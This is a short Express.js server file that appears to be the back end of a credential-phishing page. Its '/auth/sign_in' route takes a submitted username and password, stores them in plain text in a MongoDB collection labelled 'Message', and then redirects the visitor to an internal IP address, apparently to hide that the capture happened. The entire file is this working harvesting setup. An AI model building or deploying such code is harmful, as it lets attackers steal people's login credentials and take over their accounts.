require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const Message = require('./model/message')

const app = express();

app.use(bodyParser.urlencoded({extended: true}))

app.use(express.static("public"));

//connect to mongoose
mongoose.connect(process.env.MONGODB);

app.get("/", function(req, res){
    res.sendFile(__dirname+"/index.html");
});

app.post("/auth/sign_in", async (req, res) =>{
    username = req.body.user_name;
    password = req.body.password;

    try{
        const response = await Message.create({
            username,
            password
        });
    } catch(err){
        throw err
    }

    res.redirect("http://10.240.1.87")
});


// start lister
let port = process.env.PORT;
if(port == null || port ==""){
    port = 9001;
}

//listener
app.listen(port, function(){
    console.log("Server has started successfully.");
    
});
//done